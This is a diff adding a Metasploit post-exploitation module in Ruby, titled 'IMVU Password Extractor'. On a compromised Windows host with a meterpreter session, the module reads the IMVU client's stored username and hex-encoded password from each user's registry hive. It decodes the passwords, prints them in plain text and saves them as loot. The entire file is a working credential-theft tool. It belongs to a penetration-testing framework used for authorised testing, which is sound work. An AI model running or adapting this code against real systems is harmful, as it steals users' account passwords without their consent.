@@ -1,0 +1,91 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+
+
+require 'msf/core' 
+require 'msf/core/post/windows/registry'
+
+class Metasploit3 < Msf::Post
+
+	include Msf::Post::Windows::Registry
+	include Msf::Auxiliary::Report
+	include Msf::Post::Windows::UserProfiles
+
+
+	def initialize(info = {})
+		super(update_info(info, 
+			'Name'           => 'IMVU Password Extractor',
+			'Description'    => %q{
+				This module extracts account Userame & password From IMVU Client and stores
+				it as loot.
+				},
+			'Author'         =>
+				[
+				'Shubham Dawra <shubham2dawra[at]gmail.com>',
+				'SecurityXploded Team', #www.SecurityXploded.com
+				],
+			'License'        => MSF_LICENSE, 
+			'Version'        => '$Revision$', 
+			'Platform' => [ 'windows' ],
+			'SessionTypes' => [ 'meterpreter' ]
+		))
+	end
+
+
+	def run
+
+		creds = Rex::Ui::Text::Table.new(
+			'Header' => 'IMVU Credentials',
+			'Ident' => 1,
+			'Columns' =>[
+				'User',
+				'Password'
+			]
+		)
+
+		credcount=0
+		userhives=load_missing_hives()
+		userhives.each do |hive|
+			next if hive['HKU'] == nil
+
+			print_status("Looking at Key #{hive['HKU']}") if datastore['VERBOSE']
+			subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU\\")
+			if subkeys.nil? or subkeys.empty?
+				print_status ("IMVU not installed for this user.")
+				next
+			end 
+			user = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\username\\", "")
+			hpass = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\password\\", "")
+			decpass = [ hpass.downcase.gsub(/'/,'').gsub(/\\?x([a-f0-9][a-f0-9])/, '\1') ].pack("H*")
+			print_good("User=#{user}, Password=#{decpass}")
+			creds << [user, decpass]
+			credcount = (credcount + 1)
+		end
+		print_status("#{credcount} Credentials were found.")
+
+		if credcount > 0 
+			print_status("Storing data...")
+			path = store_loot(
+				'imvu.user.creds',
+				'text/plain',
+				session,
+				creds,
+				'imvu_user_creds.txt',
+				'IMVU User Credentials'
+			)
+
+			print_status("IMVU user credentials saved in: #{path}")
+		end
+
+	end
+
+end
